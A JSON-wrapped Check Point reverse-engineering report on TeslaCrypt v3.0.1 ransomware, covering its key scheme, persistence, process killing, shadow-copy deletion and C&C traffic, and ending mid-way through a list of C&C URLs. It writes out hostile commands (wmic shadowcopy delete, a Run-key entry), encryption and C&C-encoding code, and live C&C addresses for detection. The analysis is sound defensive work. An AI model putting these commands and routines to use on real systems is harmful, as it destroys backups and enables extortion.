{
    "id": "4eb499ee-780a-4556-b2b0-dc0e3ab375c8",
    "created_at": "2022-10-25T16:48:17.786405Z",
    "updated_at": "2025-03-27T02:16:53.083573Z",
    "deleted_at": null,
    "sha1_hash": "4d5c139dec02bcbb7374ca682c7406b607c4ba4f",
    "title": "Word Template",
    "authors": "",
    "file_creation_date": "2016-05-12T09:53:11Z",
    "file_modification_date": "2016-05-12T09:58:28Z",
    "file_size": 608100,
    "plain_text": "# CHECK POINT LOOKING INTO TESLACRYPT V3.0.1\n\n**BY STANISLAV SKURATOVICH, MALWARE REVERSE ENGINEER**\n**MALWARE REVERSE ENGINEERING TEAM**\n\n## OVERVIEW\n\nTeslaCrypt is a very popular ransomware that first appeared in the wild at the beginning of 2015. Since its\nfirst appearance, TeslaCrypt has undergone several version changes, with each version introducing new\nabilities, fixing old bugs, adding new evasion techniques and using new technologies.\n\nSeveral months ago, a new version of TeslaCrypt, v3.0.1 was released. It again introduces several notable\nchanges, perhaps the most important of which is the ability to encrypt files while offline – i.e., C&C\ncommunication is not mandatory to initiate the encryption process. The new version also hides its activities\nby executing on very low priority, as well as closing applications that may lead to detection.\n\nTo provide a better understanding of the newly implemented mechanisms that support these new features,\nour research teams decided to closely examine this new version. This report details the inner workings of\nTelsaCrypt v3.0.1, as well as provides techniques that can be used to detect and block its malicious\noperations.\n\n## MALWARE FUNCTIONALITY AND PAYLOAD\n\nThe ransomware performs some initialization steps before starting the routines responsible for key\ngeneration and data decryption. First of all, the malware checks the `SECURITY_MANDATORY level by calling`\nthe GetSidSubAuthority function and removes the :ZoneIdentifier stream from a binary file. If the\nintegrity level is SECURITY_MANDATORY_LOW_RID, the ransomware uses the ShellExecuteEx function with\na runas action for this command:\n```\n{WINDOWS_DIRECTORY}\\system32\\cmd.exe /c \"\" ${PATH_TO_EXE}\n\n```\n©2016 Check Point Software Technologies Ltd. All rights reserved.\n\n\n1\n\n\n-----\n\nIf the `SECURITY_MANDATORY` level is different, the ransomware checks if its path to the execution file contains\nthe windir environment variable or `CSIDL_MYDOCUMENTS` (which depends on the user belonging to the\nAdministrator group). If the path contains these specific directories, the ransomware continues execution.\nOtherwise, it copies the image file to one of the directories, depending on the user account rights. The name\nof the file is generated randomly and contains 0x0C lower ASCII symbols. It then executes the newly copied\nfile and removes the original file with this command:\n```\n{WINDOWS_DIRECTORY}\\system32\\cmd.exe /c DEL ${PATH_TO_EXE}\n\n```\nThe ransomware tries to stay persistent on the infected system by adding the following entry to the registry\nkey:\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  ${STRING_0x0C_RAND_LOWER}=\"C:\\WINDOWS\\system32\\cmd.exe /c start \"\"\n\"${PATH_TO_EXE}\"\"\n\n```\nIn order to allow higher level applications to access mapped network drives, the ransomware sets the\nfollowing registry key value to 1:\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Syste\nm\\EnableLinkedConnections\n\n```\nThe ransomware reads the image checksum by accessing the field IMAGE_NT_HEADERS.Optional```\nHeader.CheckSum. The strange thing is that it saves only the 2 middle bytes of that checksum in the process\n\n```\nspace. To run only one instance of the executable, the ransomware creates a mutex with the following name:\n```\n8765-123rvr4\n\n```\nAt this point, the ransomware starts checking if it was already executed on the infected computer. First of all,\nit queries the following registry keys for the presence of the `ID` subkey:\n```\nHKEY_USERS\\S-1-5-18\\Software\\zzzsys\nHKEY_CURRENT_USER\\Software\\zzzsys\n\n```\nIf such a subkey is present, the ransomware reads the value stored under it. This subkey specifies the\n```\nInstanceID for the compromised machine. If the subkey is absent, the ransomware generates 0x08 random\n\n```\nbytes (InstanceID) and stores them under the HKEY_CURRENT_USER\\Software\\zzzsys\\ID registry key.\n```\nThe ID is converted to the hexlified string representation using the following format: %X%X%X%X%X%X%X%X.\n\n```\nAfter generating or loading the ID, the ransomware checks the following registry keys for the presence of the\n```\ndata subkey:\nHKEY_USERS\\S-1-5-18\\Software\\zzzsys\\hexlified_ID\nHKEY_CURRENT_USER\\Software\\zzzsys\\hexlified_ID\n\n```\n\n-----\n\nIf the data subkey is present and the value length is equal to 0x100 bytes, the ransomware assumes that all\nglobal encryption keys are generated and initializes the following buffers:\n```\nstruct reg_data {\n  char EC_GLOB_BTN_ADDR[0x30]; // Bitcoin Address\n  char G_EC_REC_PUB__AES_EC_GLOB_PRIV[0x80]; // Global recovery data\n  char EC_GLOB_PUB_point2oct[0x48]; // Global public key converted to octet\nstring (see: OpenSSL EC_POINT_point2oct())\n uint64_t EncryptionKeysGenerationTime; // Time when encryption keys were\ngenerated\n};\n\n```\nIf the data is valid, the ransomware generates only session ECDH keys (see Session ECDH key\n**generation) that will be used for data encryption. If the data is absent or invalid, the ransomware performs**\nthe whole process of encryption key generation (see Encryption key generation). After the generation\nprocess, keys are saved to the following registry key using the same structure presented above:\n```\nHKEY_CURRENT_USER\\Software\\zzzsys\\hexlified_ID\\data\n\n```\nAt this point, all initialization steps are performed, so the ransomware starts the following threads:\n\n  - Process killing thread (see Process killing thread).\n\n  - Remove Shadow Copy thread (see Remove shadow copy thread) if the\n```\n    OSVERSIONINFO.dwBuildNumber does not equal the 0xA28, which refers to the Windows XP build\n\n```\nnumber.\n\nBefore starting disk encryption, the ransomware decrypts some additional information as file extensions that\nare normally encrypted: C&C server addresses and messages about the ransom. The decryption process\nstarts with some preprocessing of encrypted internal data. After that, the preprocessed data is decrypted\nusing a RC2-CBC-PKCS5 stream cipher with the key kasdfgh283 and an IV specific for each decrypted\nstring. See Appendix G for the list of decrypted file extensions. As the ransomware uses a specific key for\ndata decryption, the technique described in Appendix B can be used to detect the presence of TeslaCrypt\nand prevent disk encryption (at least for the described version).\n\nThe ransomware generates a random string with a length of 0x09 bytes and uses it as part of the recovery\nfile name:\n```\nCSIDL_MYDOCUMENTS\\recover_file_${rand_name}.txt\n\n```\n\n-----\n\nThe following data is saved to this file (each field is separated with a newline symbol `\\n):`\n\n### Format Data Representation\n```\n%s EC_GLOB_BTN_ADDR Plaintext\n%s G_EC_REC_PUB__AES_EC_GLOB_PRIV Hexlified data\n%s hexlified_id Plaintext\n%d Image partial checksum Number\n\n```\nAnother thing the malware does is prepare 3 versions of the ransom message: as a web page (see\n**Appendix E), as an image (see Appendix D), and as a plaintext message (see Appendix F). After all these**\nactions, the ransomware starts the following threads:\n\n  - Internet communication thread that is responsible for sending the `Sub=Ping command to the C&C`\nserver (see Network and Communication).\n\n  - Encryption thread, setting its priority to IDLE to avoid drastic increase of CPU usage.\n\nThe ransomware performs disk encryption operations using an AES-CBC-128 algorithm with the previously\ngenerated random keys. The file header that stores encryption-related information and encrypted data are\nstored in the original file. After these operations, the ransomware appends an `.mp3 extension to the original`\nfile name. Recovery files that notify the user about the encryption are stored in the directories. For more\ninformation, see Encryption thread.\n\nThe ransomware waits until the encryption thread finishes the disk encryption. After the encryption process is\nfinished, the ransomware creates three files on the desktop and executes the `ShellExecute function with`\nthe action open to show these files to the user:\n\n### Path Content\n```\n${DESKTOP}\\RECOVERY.TXT Ransom message in plaintext\n${DESKTOP}\\RECOVERY.HTM Ransom message as web-page \n${DESKTOP}\\RECOVERY.png Ransom message as image\n\n```\nAt this point, the encryption process is finished, so the ransomware starts the following threads:\n\n  - Internet communication thread that is responsible for sending the `Sub=Crypted command to the`\nC&C server (see Network and Communication).\n\n  - Remove Shadow Copy thread for the second time (see Remove shadow copy thread) if the\n```\n    OSVERSIONINFO.dwBuildNumber does not equal the 0xA28, which refers to Windows XP build\n\n```\nnumber.\n\nAt the end, the ransomware performs cleaning operations by removing the executable file from the disk using\nthis command:\n```\n{WINDOWS_DIRECTORY}\\system32\\cmd.exe /c DEL ${PATH_TO_EXE}\n\n```\n|Format|Data|Representation|\n|---|---|---|\n|%s|EC_GLOB_BTN_ADDR|Plaintext|\n|%s|G_EC_REC_PUB__AES_EC_GLOB_PRIV|Hexlified data|\n|%s|hexlified_id|Plaintext|\n|%d|Image partial checksum|Number|\n\n|Path|Content|\n|---|---|\n|${DESKTOP}\\RECOVERY.TXT|Ransom message in plaintext|\n|${DESKTOP}\\RECOVERY.HTM|Ransom message as web-page|\n|${DESKTOP}\\RECOVERY.png|Ransom message as image|\n\n\n-----\n\n## RANDOM FUNCTION\n\nTo generate random data, the ransomware uses its own randomization function. When the randomization\nfunction is called, the ransomware checks if initialization buffers were previously generated. If not, the\nransomware starts the process of buffer initialization. To randomize data in these buffers, it uses the\nfollowing information:\n\n  - Statistical information about the LanmanWorkstation workstation, received by calling the\n```\n    NetGetStatistics function.\n\n```\n  - Statistical information about the LanmanServer server, received by calling the NetGetStatistics\nfunction.\n\n  - Random buffer of size 0x40, generated by calling the CryptGenRandom function with a\n```\n    PROV_RSA_FULL provider.\n\n```\n  - Random buffer of size 0x40, generated by calling the CryptGenRandom function with a\n```\n    PROV_INTEL_SEC provider, if such a provider is present in the system.\n\n```\n  - Heap chunk information of the ransomware process.\n\n  - Process, module, and thread information.\n\n  - `QueryPerformanceCounter function results.`\n\n  - `GlobalMemoryStatus function results.`\n\n  - Current process' PID.\n\nAfter the initialization buffers are filled, the ransomware uses them to generate random data. At the same\ntime, it changes the buffers’ initial state to avoid generating the same data. It should be emphasized that a\nSHA1 algorithm is used in this function.\n\n## ENCRYPTION KEY GENERATION\n\nThe ransomware uses asymmetric cryptography during the key generation process. Asymmetric\ncryptography protocol is called Elliptic Curve Diffie-Hellman, which is a variety of Diffie-Hellman that uses\nelliptic curve cryptography. The standardized curve secp256k1 is used during the key generation process.\nThe following parameters for this elliptic curve are used (see OpenSSL source code):\n```\n static const struct {\n   EC_CURVE_DATA h;\n   unsigned char data[0 + 32 * 6];\n } _EC_SECG_PRIME_256K1 = {\n   {\n     NID_X9_62_prime_field, 0, 32, 1\n   },\n   {\n     /* p */\n     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,\n     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,\n     0xFF, 0xFF, 0xFF, 0xFE, 0xFF, 0xFF, 0xFC, 0x2F,\n\n```\n\n-----\n\n```\n     /* a */\n     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n     /* b */\n     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07,\n     /* x */\n     0x79, 0xBE, 0x66, 0x7E, 0xF9, 0xDC, 0xBB, 0xAC, 0x55, 0xA0, 0x62, 0x95,\n     0xCE, 0x87, 0x0B, 0x07, 0x02, 0x9B, 0xFC, 0xDB, 0x2D, 0xCE, 0x28, 0xD9,\n     0x59, 0xF2, 0x81, 0x5B, 0x16, 0xF8, 0x17, 0x98,\n     /* y */\n     0x48, 0x3a, 0xda, 0x77, 0x26, 0xa3, 0xc4, 0x65, 0x5d, 0xa4, 0xfb, 0xfc,\n     0x0e, 0x11, 0x08, 0xa8, 0xfd, 0x17, 0xb4, 0x48, 0xa6, 0x85, 0x54, 0x19,\n     0x9c, 0x47, 0xd0, 0x8f, 0xfb, 0x10, 0xd4, 0xb8,\n     /* order */\n     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,\n     0xFF, 0xFF, 0xFF, 0xFE, 0xBA, 0xAE, 0xDC, 0xE6, 0xAF, 0x48, 0xA0, 0x3B,\n     0xBF, 0xD2, 0x5E, 0x8C, 0xD0, 0x36, 0x41, 0x41\n   }\n };\n\n```\nThe ransomware generates three sets of ECDH keys:\n\n  - Global ECDH keys that are generated only once, when the ransomware installs itself in the system\n(further EC_GLOB_xxx).\n\n  - ECDH keys that are used to encrypt global ECDH keys (further EC_REC_xxx).\n\n  - Session ECDH keys that are generated each time, when the ransomware is restarted (further\n```\n    EC_SESS_xxx). These keys are used to encrypt the user's data.\n\n```\nThe ransomware uses AES-CBC-128 as a symmetric algorithm to encrypt the user's data.\n\nThe full process of key generation is described in the sections below. There are `EC_GENERATOR states for the`\n```\nsecp256k1 object.\n\n## GLOBAL ECDH KEY GENERATION (EC_GLOB)\n\n```\nThe ransomware starts with the global ECDH key generation. This process is described step by step:\n\n1. Generate a random number of 0x20 byte size. This number is the global private key `EC_GLOB_PRIV.`\n\nIt is deleted later to avoid data decryption without ransom payment.\n\n2. Calculate the SHA256 hashsum of EC_GLOB_PRIV. This value is called EC_GLOB_SHA_PRIV.\n\n3. Calculate the global public key EC_GLOB_PUB by performing the following operations:\n```\n   EC_GLOB_PUB = EC_GENERATOR * EC_GLOB_SHA_PRIV\n\n```\n\n-----\n\n4. Calculate the global public BitCoin key by performing the following operations:\n```\n   EC_GLOB_BTN_PUB = EC_GENERATOR * EC_GLOB_PRIV\n\n```\nAfter global keys are generated, the ransomware moves to the process of global recovery key generation.\nThe ransomware calculates the BitCoin address EC_GLOB_BTN_ADDR using EC_GLOB_BTN_PUB as a public\nkey.\n\n## RECOVERY ECDH KEY GENERATION (EC_REC)\n\nThe ransomware performs the following steps to generate the global recovery key:\n\n1. Import the server public key SRV_PUB by setting hardcoded affine coordinates from the binary.\n```\n   X=0x95667250209D992A05553BDF8CB0E1320B04B2E0FF9177FE88C32CF125FEA249\n   Y=0x198DCC6F24BCD3D38BE3A62A8F41F92E9D1A4690B54A2D8E4928A933312C643B\n\n```\n2. Generate a pair of private/public keys EC_REC_PRIV and\n```\n   EC_REC_PUB = EC_GENERATOR * EC_REC_PRIV\n    EC_REC_PRIV is deleted later to avoid data decryption without ransom payment.\n\n```\n3. Generate a global shared secret key using the SHA256 hashsum of:\n```\n   GLOB_SHARED = EC_REC_PRIV * SRV_PUB\n\n```\nThis value is called GLOB_SHA_SHARED.\n\n4. Encrypt EC_GLOB_PRIV using an AES-CBC-128 encryption algorithm. Concatenate EC_REC_PUB and\n\nencrypted EC_GLOB_PRIV to receive global recovery data G_EC_REC_PUB__AES_EC_GLOB_PRIV. The\ncode is presented below:\n```\n   def gen_global_rec_data(EC_GLOB_PRIV, GLOB_SHA_SHARED, EC_REC_PUB):\n    IV = '\\x00' * 16\n    ciphertext = aes_encrypt(GLOB_SHA_SHARED, IV, EC_GLOB_PRIV, False)\n     return EC_REC_PUB + ciphertext\n\n## SESSION ECDH KEY GENERATION (EC_SESS)\n\n```\nThe ransomware performs these steps to generate a session AES-CBC-128 encryption key (used to encrypt\nthe user's data):\n\n1. Generate a random buffer of 0x20 byte size. The generated buffer is used as a key for the AES-CBC\n128 algorithm (further SESS_AES_KEY).\n\n\n-----\n\n2. Generate a pair of private/public keys EC_SESS_PRIV and\n```\n  EC_SESS_PUB = EC_GENERATOR * EC_SESS_PRIV\n  EC_SESS_PRIV is deleted later to avoid data decryption without ransom payment.\n\n```\n3. Generate a session shared secret key using the SHA256 hashsum of:\n```\n  SESS_SHARED = EC_SESS_PRIV * EC_GLOB_PUB\n\n```\nThis value is called SESS_SHA_SHARED.\n\n4. Encrypt SESS_AES_KEY using an AES-CBC-128 encryption algorithm. Concatenate EC_SESS_PUB and\n\nencrypted SESS_AES_KEY to receive the shared recovery data G_EC_SESS_PUB__AES_SESS_AES_KEY.\nThe code is presented below:\n```\n  def gen_shared_rec_data(SESS_AES_KEY, SESS_SHA_SHARED, EC_SESS_PUB):\n   IV = '\\x00' * 16\n   ciphertext = aes_encrypt(SESS_SHA_SHARED, IV, SESS_AES_KEY, False)\n   return EC_SESS_PUB + ciphertext\n\n```\n\n-----\n\n### Random EC_SESS_PRIV EC_SESS_PUB = EC_GENERATOR * EC_SESS_PRIV\n SESS_SHA_SHARED = SHA256(EC_SESS_PRIV *\n EC_GLOB_PUB) G_EC_SESS_PUB__AES_SESS_AES_KEY = EC_SESS_PUB |\n```\n     AES(SESS_SHA_SHARED, SESS_AES_KEY)\n\n```\n\n### AES(SESS_AES_KEY, FILE_CONTENT)\n\n\n### Encryption key generation\n\n\n### Import SRV_PUB\n\n\n### Random EC_GLOB_PRIV\n\n\n-----\n\n## PROCESS KILLING THREAD\n\nThis thread is responsible for enumerating currently running processes in the operating system by using\nfunction EnumProcesses. The ransomware kills a process if one of the following substrings is found in the\nprocess' name:\n\n### Substrings Blacklisted processes\n```\nAskmg Task Manager\nRocex Process Explorer\nEgedi Registry Editor\nsconfi System Configurator\nCmd Command Line\n\n## REMOVE SHADOW COPY THREAD\n\n```\nThis thread is responsible for removing shadow copies on the affected system to avoid restoring encrypted\nfiles from backup. The following steps are performed:\n\n1. Disable file system redirection for the current thread, if the `Wow64DisableWow64FsRedirection`\n\nfunction is available.\n\n2. Execute the ShellExecuteEx function with one the following commands:\n```\n   wmic.exe shadowcopy delete /noninteractive (verb=runas)\n   wmic.exe shadowcopy delete /noninteractive (verb=open)\n\n```\nThe command depends on membership in the Local Administrator Group.\n\n3. Revert file system redirection for the current thread, if the `Wow64RevertWow64FsRedirection`\n\nfunction is available.\n\n## ENCRYPTION THREAD\n\nThe ransomware generates a pseudo-random string (further REC_FILENAME) of 5 byte length using the rand\nfunction and the value returned by GetTickCount as a seed.\n\nThe ransomware gets all the drives in the system by calling the `GetLogicalDriveStrings function. Drives`\n```\nA:\\ and B:\\ are skipped. Drives that are not of one of the following types are skipped as well: \nDRIVE_FIXED\nDRIVE_REMOTE\nDRIVE_REMOVABLE\n\n```\nAt the same time, all network resources are enumerated recursively using the `WNet family functions. The`\nransomware looks for resources with the type RESOURCETYPE_DISK. If such a resource is found, its remote\nname is added to the array of paths to encrypt.\n\n|Substrings|Blacklisted processes|\n|---|---|\n|Askmg|Task Manager|\n|Rocex|Process Explorer|\n|Egedi|Registry Editor|\n|sconfi|System Configurator|\n|Cmd|Command Line|\n\n\n-----\n\nAll drives and network disk resources are encrypted according to the rules described below.\n\nThe ransomware enumerates the directories recursively and performs the following actions inside each:\n\n1. Encrypt files in the directory (see Encrypt files).\n\n2. Check if the directory name belongs to the list presented below. If the name equals one of these, this\n\ndirectory is omitted:\n```\nCSIDL_COMMON_DESKTOPDIRECTORY\nCSIDL_DESKTOPDIRECTORY\nCSIDL_CDBURN_AREA\n.*Desktop.*\n.*${MODULE_NAME}.*\n\n```\nThe following files are created in the affected directories:\n\n### File Name  File Content \n```\n \"%s\\\\%s+%s.png\" % (${CWD}, \"\"_RECoVERY_\", Image with ransom payment\n ${REC_FILENAME})  information \n \"%s\\\\%s+%s.html\" % (${CWD}, \"\"_RECoVERY_\", Web browser page with ransom payment\n ${REC_FILENAME})  information \n \"%s\\\\%s+%s.txt\" % (${CWD}, \"\"_RECoVERY_\", Plaintext with ransom payment\n ${REC_FILENAME})  information \n\n```\nIt should be emphasized that the following directories are skipped when performing the described operations:\n```\n . \n .. \n CSIDL_COMMON_APPDATA\n CSIDL_PROGRAM_FILES \n CSIDL_WINDOWS \n\n```\nIf the directory passes all the checks, the ransomware starts the process of file encryption. To check if a file\nis already encrypted or belongs to the infection meta-information file, the ransomware checks if the filename\ncontains one of the following substrings case-insensitively (such a file is skipped):\n```\n .mp3 \n recove\n\n```\nThe ransomware encrypts only files with specific extensions (see **Appendix G). The encryption routine is**\nfully described in the next subsection.\n\n|File Name|File Content|\n|---|---|\n|\"%s\\\\%s+%s.png\" % (${CWD}, \"\"_RECoVERY_\", ${REC_FILENAME})|Image with ransom payment information|\n|\"%s\\\\%s+%s.html\" % (${CWD}, \"\"_RECoVERY_\", ${REC_FILENAME})|Web browser page with ransom payment information|\n|\"%s\\\\%s+%s.txt\" % (${CWD}, \"\"_RECoVERY_\", ${REC_FILENAME})|Plaintext with ransom payment information|\n\n\n-----\n\n## ENCRYPT FILES\n\nThe ransomware does not encrypt a file if its size is less than 0x20 bytes or larger than 0x13800000 bytes. If\nthe 24th byte of a file equals the 0x04 value, the file is skipped as well.\n\nThe ransomware encrypts the file content with an AES-CBC-128 encryption algorithm. It uses the previously\ngenerated SESS_AES_KEY as a key and the hardcoded buffer as an IV. The source code for file encryption\nroutine is presented below:\n```\ndef read_file(fname):\n  with open(fname, 'rb') as f:\n   return f.read()\ndef encrypt_file(fname, SESS_AES_KEY):\n IV = '\\x12\\x65\\x1C\\x01\\x31\\x8D\\x69\\x26\\x17\\x81\\x97\\xFF\\x0E\\xAD\\xFA\\xAA'\n  return aes_encrypt(SESS_AES_KEY, IV, read_file(fname))\n\n```\nThe ransomware saves specific meta information to the encrypted file, as well as ciphertext. The structure of\nan encrypted file is presented below:\n```\nstruct enc_file {\n  char zero_0[8]; // null bytes\n  char inst_id[8]; // instance ID\n  char zero_1[8]; // null bytes\n  char G_EC_REC_PUB__AES_EC_GLOB_PRIV[0x80]; // Global recovery data\n  char EC_GLOB_PUB_point2oct[0x44]; // Global public key converted to octet\nstring (see: OpenSSL EC_POINT_point2oct())\n  char G_EC_SESS_PUB__AES_SESS_AES_KEY[0x80]; // Shared recovery data\n  char aes_iv_file_enc[0x10]; // AES IV used during files encryption\n uint32_t orig_file_size; // original file size\n  char enc_data[0]; // ciphertext\n};\n\n```\n\n-----\n\nThe example of encrypted file data is presented below:\n\nThe ransomware appends an .mp3 extension to the encrypted file. If a file with this name already exists, the\nransomware removes it, sleeps for 400 milliseconds, and tries to save the encrypted data to a file once\nagain.\n\n## NETWORK AND COMMUNICATION\n\nThe ransomware communicates with the C&C server to send information about the encryption keys, infected\nmachine and the malware itself. The first communication attempt is performed before the encryption process;\nthe second one is performed after all data on the compromised system is encrypted.\n\nIf the ransomware fails to establish communication with one of the C&C servers, it ends the thread without\nsending any information to the server. It should be emphasized that encryption is performed even with failed\ncommunication.\n\nThe ransomware sends packets to the C&C server using HTTP POST requests on the default TCP/80 port,\nwith the following header values:\n```\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUserAgent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0)\nlike Gecko\n\n```\n\n-----\n\n## CLIENT REQUEST\n\nThe HTTP POST request contains the following data:\n```\nSub=%s&dh=%s&addr=%s&size=%lld&version=%s&OS=%ld&ID=%d&inst_id=%X%X%X%X%X%X%X%X\n\n```\nEach parameter is described below.\n\n### Field Name  Description  Sub  Command type  dh  Hexlified ECDH Global recovery key G_EC_REC_PUB__AES_EC_GLOB_PRIV addr  Machine-specific bitcoin address, where ransom should be paid  size  Size of encrypted files in total (Mb)  version  Malware version (3.0.1 in researched sample)  OS  Operating system build number  ID  Part of malware image file checksum  inst_id  Machine-specific unique ID \n\nWhen sending the initial packet to the C&C server, the ransomware uses the `Sub=Ping command type.`\nWhen sending the packet after whole disk encryption, the ransomware uses the Sub=Crypted command\ntype.\n\nThe ransomware encrypts and encodes the data when it communicates with the C&C. It calculates the\nSHA256 checksum of the decrypted hardcoded string 0324532423723948572379453249857. The received\nhashsum is used as a key for the AES-CBC-128 encryption algorithm. The full code is presented below:\n```\nfrom binascii import hexlify\nfrom hashlib import sha256\ndef inet_encrypt(data):\n data += '\\x00'\n IV = '\\xFF\\xFF\\xAA\\xAA\\x00\\x00\\xBE\\xEF\\xDE\\xAD\\x00\\x00\\xBE\\xFF\\xFF\\xFF'\n key = sha256('0324532423723948572379453249857')\n  return aes_encrypt(key, IV, data)\ndef inet_http_prepare(data):\n  return 'data=%s' % hexlify(inet_encrypt(data))\n\n```\nThe ransomware uses one of the hardcoded C&C servers (see Indicators of Compromise) to notify about\nthe current state.\n\nIt should be emphasized that there is a possibility to decrypt the packet sent to the C&C server and\ndetermine if it belongs to the TeslaCrypt process, thus breaking its execution (see Appendix C).\n\n|Field Name|Description|\n|---|---|\n|Sub|Command type|\n|dh|Hexlified ECDH Global recovery key G_EC_REC_PUB__AES_EC_GLOB_PRIV|\n|addr|Machine-specific bitcoin address, where ransom should be paid|\n|size|Size of encrypted files in total (Mb)|\n|version|Malware version (3.0.1 in researched sample)|\n|OS|Operating system build number|\n|ID|Part of malware image file checksum|\n|inst_id|Machine-specific unique ID|\n\n\n-----\n\n## SERVER RESPONSE\n\nThe ransomware assumes that the C&C handled the request correctly if the response contains the `INSERTED`\nstring.\n\n## DECRYPTION PROCESS\n\nThis section presents the details of the decryption process that may be performed after ransom payment:\n\n1. The infected computer has the following meta information about encryption process:\n```\n    G_EC_SESS_PUB__AES_SESS_AES_KEY, EC_GLOB_PUB, G_EC_REC_PUB__AES_EC_GLOB_PRIV.\n\n```\n2. As G_EC_REC_PUB__AES_EC_GLOB_PRIV was previously transferred to the C&C server, the decrypter\n\ncan extract the EC_REC_PUB key and calculate:\n```\n   GLOB_SHARED = SRV_PRIV * EC_REC_PUB\n\n```\nIt then calculates the SHA256 hashsum of the key GLOB_SHA_SHARED.\n\n3. It can decrypt EC_GLOB_PRIV using an AES-CBC-128 algorithm with GLOB_SHA_SHARED as a key, and\n\nthen calculate the SHA256 hashsum of EC_GLOB_SHA_PRIV. It sends this key with a local decrypter\nto the infected machine.\n\n4. The local decrypter on the infected machine enumerates all encrypted files and uses\n```\n    EC_GLOB_SHA_PRIV to restore the session shared key:\n   SESS_SHARED = EC_SESS_PUB * EC_GLOB_SHA_PRIV\n\n```\nIt then calculates the SHA256 hashsum of SESS_SHA_SHARED. EC_SESS_PUB is taken from session\nrecovery data G_EC_SESS_PUB__AES_SESS_AES_KEY that is saved in the encrypted file header.\n\n5. The local decrypter on the infected machine decrypts SESS_AES_KEY key using an AES-CBC-128\n\nalgorithm with the key SESS_SHA_SHARED.\n\n6. As a last step, the decrypter restores the files using an AES-CBC-128 algorithm with the\n```\n    SESS_AES_KEY key and the IV\n    \\x12\\x65\\x1C\\x01\\x31\\x8D\\x69\\x26\\x17\\x81\\x97\\xFF\\x0E\\xAD\\xFA\\xAA that is stored in the\n\n```\nencrypted file header.\n\nIf the infected machine was not able to communicate with the C&C server, the\n```\n  G_EC_REC_PUB__AES_EC_GLOB_PRIV data was not sent. To decrypt data without sending the SRV_PRIV\n\n```\nkey to the infected machine, the cybercriminals may ask the user to send one of the encrypted files. As\nthe encrypted file header contains the G_EC_SESS_PUB__AES_SESS_AES_KEY, EC_GLOB_PUB, and\n```\n  G_EC_REC_PUB__AES_EC_GLOB_PRIV, the cybercriminals can then perform the same actions as\n\n```\ndescribed previously.\n\n\n-----\n\n### Decryption process when communication with C&C succeeded\n\n```\nServer side\n\n```\n```\n        Server side\n\n```\n```\nClient side\n\n```\n\n### GLOB_SHA_SHARED = SHA256(SRV_PRIV * EC_REC_PUB) EC_GLOB_PRIV = AES256(GLOB_SHA_SHARED, AES_EC_GLOB_PRIV)\n EC_GLOB_SHA_PRIV = SHA256(EC_GLOB_PRIV) Transfer EC_GLOB_SHA_PRIV to the infected machine\n\n\n### SESS_SHA_SHARED = SHA256(EC_SESS_PUB *\n EC_GLOB_SHA_PRIV)\n```\n  SESS_AES_KEY = AES(SESS_SHA_SHARED, AES_SESS_AES_KEY)\n\n```\n\n### AES(SESS_AES_KEY, ENC_FILE_CONTENT)\n\n\n-----\n\n### Decryption process when communication with C&C failed\n\n\n### Server side Client side\n\n\n### GLOB_SHA_SHARED = SHA256(SRV_PRIV * EC_REC_PUB) EC_GLOB_PRIV = AES256(GLOB_SHA_SHARED, AES_EC_GLOB_PRIV)\n EC_GLOB_SHA_PRIV = SHA256(EC_GLOB_PRIV) Transfer EC_GLOB_SHA_PRIV to the infected machine\n\n\n### SESS_SHA_SHARED = SHA256(EC_SESS_PUB *\n EC_GLOB_SHA_PRIV)\n```\n  SESS_AES_KEY = AES(SESS_SHA_SHARED, AES_SESS_AES_KEY)\n\n```\n\n### Send encrypted file or registry data\n\n\n### Extract G_EC_REC_PUB__AES_E\n C_GLOB_PRIV\n\n\n### Client side\n\n\n-----\n\n## SUMMARY\n\nBased on the information we presented, it seems it is impossible to decrypt data without paying a ransom, as\nwe have to solve the discrete logarithm problem. As keys are generated using a self-implemented\nrandomization function (that still contains unpredictable data), cryptographic attacks on that function may be\nsuccessful.\n\n## INDICATORS OF COMPROMISE\n\n### Static indicators\n\n  - Presence of files with the following SHA256 checksums in the filesystem:\n```\n     3e730bb707b5c9d45e10dc500f0281a50e58badbbdfa6f5038e077c4ace125d4\n     366d1629a83acad94ced95c4b782ec00a2cc0096598b6824421aed1859d37c1a\n     7097913d473590c8fc507d8b8b6eaee8cd9db77888ebb14fc193eafeac039d7a\n     79743fb8f3dbef7b6066ed030ac488fe63038708cd227e7f52f4411540f2d5a4\n     8008a7f9920f8d61f2295ab82a9a3efac0c3a1c466213fe43afe7407bdab03d7\n     f2a7d3bd2430d3d8b56d04d2d56a67cb57452e5bacf85ffe37433c73cee6d40d\n     7b709122af3222d4e533ade64ab9bef3f79c6aa97370f876af5a6b90a834c7fe\n\n### Dynamic indicators\n\n```\n  - Communication with the following C&C servers:\n```\n     http://ricardomendezabogado.com/components/com_imageshow/wstr.php\n     http://opravnatramvaji.cz/modules/mod_search/wstr.php\n     http://gianservizi.it/wp-content/uploads/wstr.php\n     http://ptlchemicaltrading.com/images/gallery/wstr.php\n     http://3m3q.org/wstr.php\n     http://suratjualan.com/copywriting.my/image/wstr.php\n     http://imagescroll.com/cgi-bin/Templates/bstr.php\n     http://music.mbsaeger.com/music/Glee/bstr.php\n     http://stacon.eu/bstr.php\n     http://surrogacyandadoption.com/bstr.php\n     